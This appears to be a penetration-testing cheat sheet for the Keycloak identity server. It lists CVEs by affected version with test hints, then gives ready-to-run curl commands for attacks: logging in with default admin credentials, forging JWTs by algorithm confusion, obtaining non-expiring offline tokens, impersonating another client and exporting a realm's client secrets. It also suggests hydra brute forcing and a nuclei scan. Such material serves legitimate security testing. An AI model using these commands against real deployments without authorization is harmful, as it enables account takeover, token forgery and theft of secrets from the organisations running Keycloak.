# Keycloak Known CVEs & Attack Vectors

Check the running version first:
```bash
curl -sk $KEYCLOAK_URL/realms/master | jq '.keycloak-version // empty'
# or check the admin UI footer
```

## Critical CVEs to Test

| CVE | Version | Description | Test |
|-----|---------|-------------|------|
| CVE-2023-6927 | < 23.0.4 | Open Redirect via `redirect_uri` | `auth_test.sh check_open_redirect` |
| CVE-2023-6484 | < 22.0.6 | Log injection via parameter | Send `\n` chars in username |
| CVE-2022-4039 | < 20.0.2 | Improper authorization in admin console | Try `/admin/` unauthenticated |
| CVE-2021-3827 | < 15.1.0 | OAuth token introspection bypass | Try `/protocol/openid-connect/token/introspect` |
| CVE-2020-10770 | < 12.0.0 | SSRF via `logout` redirect | `?redirect_uri=http://internal` |
| CVE-2020-1758 | < 9.0.3 | HTML injection in error pages | Error param injection |
| CVE-2019-3875 | < 6.0.2 | Client secret validation bypass | Omit client_secret |
| CVE-2018-14657 | < 4.2.1 | Brute force with no lockout | `hydra` against token endpoint |

## Attack Scenarios

### 1. Admin CLI Abuse
```bash
# Admin-cli is a public client by default — try without secret
curl -X POST $TOKEN_ENDPOINT \
  -d "grant_type=password&client_id=admin-cli&username=admin&password=admin"
```

### 2. JWT Algorithm Confusion (RS256 → HS256)
```bash
# Get public key from JWKS
curl -sk $JWKS_URI | jq -r '.keys[0]'
# Use jwt_tool to forge with public key as HMAC secret
./jwt_tool <token> -X k -pk public_key.pem
```

### 3. Offline Access Token
```bash
# Request offline_access scope — tokens never expire unless revoked
curl -X POST $TOKEN_ENDPOINT \
  -d "grant_type=password&client_id=$CLIENT_ID&scope=openid+offline_access&..."
```

### 4. Client Impersonation
```bash
# If client authentication is not required (public clients)
curl -X POST $TOKEN_ENDPOINT \
  -d "grant_type=authorization_code&client_id=OTHER_CLIENT_ID&code=..."
```

### 5. Realm Export via Admin REST API
```bash
# Full realm export including client secrets (if admin access gained)
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$ADMIN_URL/export?exportClients=true&exportGroupsAndRoles=true"
```

## Keycloak Nuclei Templates
```bash
nuclei -u $KEYCLOAK_URL -t keycloak/ -severity medium,high,critical
```
